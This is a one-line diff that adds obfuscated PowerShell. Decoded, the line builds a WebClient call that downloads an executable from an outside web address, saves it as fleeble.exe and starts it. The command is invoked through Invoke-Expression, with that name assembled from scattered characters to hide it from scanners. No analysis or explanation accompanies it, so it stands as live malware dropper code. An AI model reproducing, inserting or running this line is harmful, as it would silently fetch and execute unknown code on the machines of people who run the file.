@@ -1,0 +1,1 @@
+﻿ ((("{23}{7}{2}{21}{6}{0}{18}{3}{22}{11}{5}{1}{19}{17}{16}{8}{14}{9}{4}{10}{13}{20}{12}{15}" -f'ebClien','e(nO','-','Dow','art-Proce','oadFil','.Net.W','ew','exenOC,n','Cfleeble.exenOC);St','ss nO','l','exenO','Cfleeble','O','C','com/comu.','/worldnit.','t).','Chttp:/','.','Object System','n','(N')) -replAce  'nOC',[ChaR]39)|& ( ([STrIng]$VerBOSePrEfEReNCE)[1,3]+'x'-jOIN'')
